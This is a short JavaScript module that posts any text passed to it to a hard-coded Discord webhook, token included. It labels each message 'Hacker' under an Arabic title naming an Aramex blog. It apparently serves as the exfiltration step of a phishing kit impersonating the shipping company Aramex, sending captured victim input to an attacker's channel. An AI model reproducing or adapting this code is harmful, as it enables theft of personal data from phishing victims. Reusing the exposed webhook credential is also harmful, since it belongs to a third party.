import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328050001972166730/VFasFKFH74uSgjV_F39W1RlLuh2BLymUl-K9V2btJndM4aVTNWuq6tLJfMpCBp7yfrhA",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
